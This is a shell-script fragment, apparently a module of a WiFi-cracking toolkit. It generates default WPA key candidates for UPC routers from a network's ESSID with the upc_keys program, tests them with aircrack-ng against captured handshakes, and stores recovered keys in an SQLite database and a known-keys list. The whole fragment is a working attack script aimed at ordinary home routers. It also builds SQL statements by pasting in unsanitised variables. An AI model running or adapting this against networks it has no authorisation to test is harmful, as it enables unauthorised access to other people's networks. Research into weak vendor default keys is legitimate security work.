# this module uses the compiled binary of upc_keys.c by <peter@haxx.in> (https://haxx.in/upc_keys.c)
# to compile it, use gcc -O2 -o modules/upckeys modules/upc_keys.c -lcrypto (requires openssl)
# generate keys
`upckeys "$essid" "24" >> "$path"wlupctmp`
`upckeys "$essid" "5" >> "$path"wlupctmp`
# clean program output
for j in `cat "$path"wlupctmp 2>/dev/null | awk -F\' '{print $4}'`; do
    echo "$j" >> "$path"wlupc
done
# test keys
psk=`"$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w "$path"wlupc  2>/dev/null | grep FOUND | grep -oE '[0-9A-Z]{8}' | sort -u`
"$SQLITE3_BIN" "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
rm -f "$path"wl* 2>/dev/null
if [ ${#psk} -gt 7 ]; then
    echo "Key $psk found for BSSID $bssid"
    "$SQLITE3_BIN" "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
    echo "$psk" >> "$path$wl"known
    mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
    continue
fi
